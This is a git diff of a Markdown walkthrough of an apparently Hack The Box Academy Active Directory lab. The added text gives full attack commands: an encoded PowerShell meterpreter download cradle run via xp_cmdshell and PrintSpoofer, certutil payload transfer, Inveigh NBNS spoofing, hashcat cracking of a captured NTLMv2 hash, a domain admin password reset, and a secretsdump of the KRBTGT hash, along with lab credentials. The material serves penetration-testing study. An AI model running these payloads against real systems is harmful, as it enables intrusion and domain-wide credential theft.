@@ -125,7 +125,7 @@ scp Snaffler.exe htb-student@10.129.73.75:/home/htb-student/Desktop
 
 ![[Pasted image 20250519003745.png]]
 
-Now i try to run Snaffler as new user founded `BR086` i can achieve this with `runas` on powershell
+Now i try to run **Snaffler** as new user founded `BR086` i can achieve this with `runas` on powershell
 
 ```powershell
 runas /netonly /user:INLANEFREIGHT\BR086 powershell
@@ -149,7 +149,7 @@ mssqlclient.py INLANEFREIGHT/netdb:D@ta_bAse_adm1n\!@172.16.7.60
 using the `whomai /priv` command is possible to visualize all privilege. In this case we can **escalate privilege** trough **SeImpersonatePrivilage** with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe).
 ![[Pasted image 20250519013904.png]]
 
-Firs alll download and copy on attack machine
+Firs all download and copy on attack machine
 ```bash
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
@@ -157,7 +157,7 @@ scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
 
 ```
 
-now activate the `python3 -m http.server` on the ssh attack machine and download on th `SQL01` machine with the following command
+now activate the `python3 -m http.server` on the ssh attack machine and download on the `SQL01` machine with the following command
 ```bash
 xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
 ```
@@ -188,3 +188,99 @@ crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --get-fil
 
 ![[Pasted image 20250519020119.png]]
 
+Using msfconsole with `web_delivery` module i have create a PowerShell meterpreter shell
+![[Pasted image 20250519224425.png]]
+Once do that i execute this payload in the `SQL01` target machine trough PrintSpoofer64 to have a administrator shell
+
+```bash
+xp_cmdshell C:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB2AE4ATQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJAB2AE4ATQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHYATgBNAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AbgBhADEAVAA1ADQAZwAwAHYAOAAvADYAYgBzAEMARQBnAFgAbwBTAHgASABjAFMAZQBXACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADcALgAyADQAMAA6ADgAMAA4ADAALwBuAGEAMQBUADUANABnADAAdgA4ACcAKQApADsA"
+output     
+```
+
+![[Pasted image 20250519224606.png]]
+
+
+![[Pasted image 20250519231217.png]]
+
+Credentials founded
+
+The same thing but using `Crackmapexec` 
+
+![[Pasted image 20250519233121.png]]
+
+| user     | password                 |
+| -------- | ------------------------ |
+| mssqlsvc | Sup3rS3cur3maY5ql$3rverE |
+
+retrieve the flag on the Administrator desktop of `DC01`
+
+```bash
+crackmapexec smb 172.16.7.50 -u mssqlsvc -p 'Sup3rS3cur3maY5ql$3rverE' -d INLANEFREIGHT --get-file 'Users\Administrator\Desktop\flag.txt' flag.txt
+```
+
+----
+
+Download and transfer `Inveigh` on `MS01`
+
+```bash
+wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop
+```
+
+Import the module
+```bash
+Set-ExecutionPolicy Bypass -Scope Process
+Import-Module .\Inveigh.ps1
+```
+
+run the Invoke-Inveigh
+```bash
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+- `-NBNS`: Enable spoofing NBNS (NetBios Name Service), respond to the request tricky the server to respond us.
+
+![[Pasted image 20250520002127.png]]
+
+```hash
+CT059::INLANEFREIGHT:2f1040e798e80f65:a774eeaf280d92f7034a7098b6ba18c5:0101000000000000b1ea03500cc9db01cb29d99e5a8810660000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0007000800b1ea03500cc9db01060004000200000008003000300000000000000000000000002000006ff8eaf7d447a25d5ecdfb36d7c7427c37423c781a2b91271944adf19311d2820a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000
+```
+
+Now i crack this with `hashcat`
+
+```bash
+hashcat -m 5600 NTLMv2_hash /usr/share/wordlists/rockyou.txt
+```
+
+| User  | Password |
+| ----- | -------- |
+| CT059 | charlie1 |
+
+----
+As bloodhunt explain the CT059 have the `GenericAll` over `Domain Admins` group
+![[Pasted image 20250520004617.png]]
+
+Connect on `MS01` with CT059 user
+```bash
+xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1
+```
+
+Now use this command to change the password of administrator account in `Domain Admins` group
+```bash
+net user administrator Welcome1 /domain
+```
+
+Now i have access on 172.16.7.3 `DC01` server
+```bash
+crackmapexec smb 172.16.7.3 -u Administrator -p Welcome1 -d INLANEFREIGHT  --get-file "\Users\Administrator\Desktop\flag.txt" flag_dc01.txt
+```
+
+![[Pasted image 20250520010018.png]]
+Now i can perform `kerberoast` attack over KRBTGT using `secretsdump.py`
+```bash
+secretsdump.py INLANEFREIGHT/Administrator@172.16.7.3 -just-dc-user KRBTGT
+```
+
+
+| user   | hash                                                                            |
+| ------ | ------------------------------------------------------------------------------- |
+| KRBTGT | krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f::: |
